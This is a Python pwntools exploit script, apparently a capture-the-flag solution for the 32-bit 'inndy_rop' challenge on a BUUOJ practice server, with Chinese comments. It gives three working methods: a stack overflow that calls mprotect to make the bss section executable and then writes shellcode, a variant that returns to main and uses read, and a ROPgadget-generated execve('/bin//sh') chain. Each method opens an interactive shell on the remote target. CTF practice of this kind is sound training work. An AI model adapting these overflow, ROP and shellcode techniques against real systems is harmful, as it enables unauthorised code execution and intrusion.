from pwn import *
from struct import pack


r = remote('node5.buuoj.cn', 28642)
# r = process(r'./inndy_rop')
# elf = ELF(r'./inndy_rop')

context.arch = 'i386'
context.log_level = 'debug'

overflow_addr = 0x804887C
main_addr = 0x8048894
read_addr = 0x806D290
# gets_addr = 0x8048889
gets_addr = 0x804F0D0
mprotect_addr = 0x806DDA0
start_addr = 0x80eb000  # bss_start
size = 0x1000
premit = 0x7
pop_edi_esi_ebx = 0x08062d2b


# gdb.attach(r)

# ============== 方法1 =====================
# 使用三个寄存器传参数修改bss权限，直接回到gets函数写入shellcode （没有read函数的时候使用）
payload = b'A' * 0xC + b'B' * 4 + p32(mprotect_addr) + p32(overflow_addr) + p32(start_addr) + p32(size) + p32(premit)
r.sendline(payload)

payload2 = b'A' * 0xC + b'B' * 4 + p32(gets_addr) + p32(overflow_addr) + p32(start_addr)
r.sendline(payload2)
shellcode = asm(shellcraft.sh(), arch='i386')
r.sendline(shellcode)
r.interactive()

'''
# =============== 方法2 ==================== (推荐)
# mprotect函数压寨传参数修改bss权限，再回到main函数再次溢出写入shellcode到start_addr
payload = b'A' * 0xC + b'B' * 4 + p32(mprotect_addr) + p32(main_addr) + p32(start_addr) + p32(size) + p32(premit)
r.sendline(payload)

payload2 = b'A' * 0xC + b'B' * 4 + p32(read_addr) + p32(start_addr) + p32(0) + p32(start_addr) + p32(0x100)
r.sendline(payload2)

shellcode = asm(shellcraft.sh(), arch='i386')
r.sendline(shellcode)
r.interactive()
'''

"""
# ============== 方法3 =====================
# 使用ROPgadget自动生成本静态链接程序的ROPChain利用代码。
#
# ROPgadget --binary rop --ropchain
p = b'A' * 0xC + b'B' * 4
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b8016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de769) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0806c943) # int 0x80

r.sendline(p)
r.interactive()
"""